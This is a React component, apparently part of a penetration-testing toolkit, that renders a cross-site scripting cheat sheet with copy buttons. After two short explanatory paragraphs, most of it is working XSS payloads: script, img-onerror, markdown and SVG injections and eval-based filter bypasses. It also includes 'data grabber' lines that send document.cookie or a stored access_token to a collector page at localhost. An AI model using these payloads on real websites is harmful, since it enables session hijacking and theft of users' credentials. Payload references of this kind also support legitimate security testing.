import React from "react";
import { Typography, Divider } from "antd";
import QueueAnim from "rc-queue-anim";
const { Title, Paragraph } = Typography;

export default (props) => {
  const DataGrabber = [
    {
      title:
        "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
    },
    {
      title:
        "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
    },
    {
      title:
        "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>",
    },
    {
      title:
        "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>",
    },
  ];
  const BasicXSS = [
    { title: "<script>alert('XSS')</script>" },
    { title: "<scr<script>ipt>alert('XSS')</scr<script>ipt>" },
    { title: '"><script>alert("XSS")</script>' },
    { title: '"><script>alert(String.fromCharCode(88,83,83))</script>' },
  ];
  const ImgPayload = [
    { title: "<img src=x onerror=alert('XSS');>" },
    { title: "<img src=x onerror=alert('XSS')//" },
    { title: "<img src=x onerror=alert(String.fromCharCode(88,83,83));>" },
    {
      title: "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
    },
    { title: "<img src=x:alert(alt) onerror=eval(src) alt=xss>" },
    { title: '"><img src=x onerror=alert("XSS");>' },
    { title: '"><img src=x onerror=alert(String.fromCharCode(88,83,83));>' },
  ];
  const XSSMarkdown = [
    { title: "[a](javascript:prompt(document.cookie))" },
    { title: "[a](j a v a s c r i p t:prompt(document.cookie))" },
    {
      title:
        "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    },
    { title: "[a](javascript:window.onerror=alert;throw%201)" },
  ];
  const XSSSvg = [
    {
      title:
        "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>",
    },
    { title: "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>" },
    {
      title:
        "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
    },
    {
      title: "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
    },
  ];
  const BypassWord = [
    { title: "eval('ale'+'rt(0)');" },
    { title: "Function('ale'+'rt(1)')();" },
    { title: "new Function`alert`6``;" },
    { title: "setTimeout('ale'+'rt(2)');" },
    { title: "setInterval('ale'+'rt(10)');" },
    { title: "Set.constructor('ale'+'rt(13)')();" },
    { title: "Set.constructor`al\x65rt\x2814\x29```;" },
  ];
  return (
    <QueueAnim delay={300} duration={1500}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        Cross Site Scripting (XSS)
      </Title>
      <Paragraph style={{ margin: 15 }}>
        Cross-Site Scripting (XSS) attacks are a type of injection, in which
        malicious scripts are injected into otherwise benign and trusted
        websites. XSS attacks occur when an attacker uses a web application to
        send malicious code, generally in the form of a browser side script, to
        a different end user.
      </Paragraph>
      <Paragraph style={{ marginLeft: 15 }}>
        Flaws that allow these attacks to succeed are quite widespread and occur
        anywhere a web application uses input from a user within the output it
        generates without validating or encoding it.
      </Paragraph>
      <Divider dashed />
      <div
        key='a'
        style={{
          padding: 15,
        }}
      >
        <Title level={3}>Data grabber for XSS</Title>
        <Paragraph>
          Obtains the administrator cookie or sensitive access token, the
          following payload will send it to a controlled page.
        </Paragraph>
        {DataGrabber.map((k, i) => {
          return (
            <Paragraph key={i} copyable>
              {k.title}
            </Paragraph>
          );
        })}
      </div>
      <Divider dashed />
      <div
        key='b'
        style={{
          padding: 15,
        }}
      >
        <Title level={3}>XSS in HTML/Applications</Title>
        <Title level={4}>Basic Payload</Title>
        {BasicXSS.map((k, i) => {
          return (
            <Paragraph key={i} copyable>
              {k.title}
            </Paragraph>
          );
        })}
        <Title level={4}>Img tag payload</Title>
        {ImgPayload.map((k, i) => {
          return (
            <Paragraph key={i} copyable>
              {k.title}
            </Paragraph>
          );
        })}
      </div>
      <div
        key='c'
        style={{
          padding: 15,
        }}
      >
        <Divider dashed />
        <Title level={3}>XSS in Markdown</Title>
        {XSSMarkdown.map((k, i) => {
          return (
            <Paragraph key={i} copyable>
              {k.title}
            </Paragraph>
          );
        })}
      </div>
      <Divider dashed />
      <div
        key='d'
        style={{
          padding: 15,
        }}
      >
        <Title level={3}>XSS in SVG (short)</Title>
        {XSSSvg.map((k, i) => {
          return (
            <Paragraph key={i} copyable>
              {k.title}
            </Paragraph>
          );
        })}
      </div>
      <Divider dashed />
      <div
        key='e'
        style={{
          padding: 15,
        }}
      >
        <Title level={3}>Bypass word blacklist with code evaluation</Title>
        {BypassWord.map((k, i) => {
          return (
            <Paragraph key={i} copyable>
              {k.title}
            </Paragraph>
          );
        })}
      </div>
    </QueueAnim>
  );
};
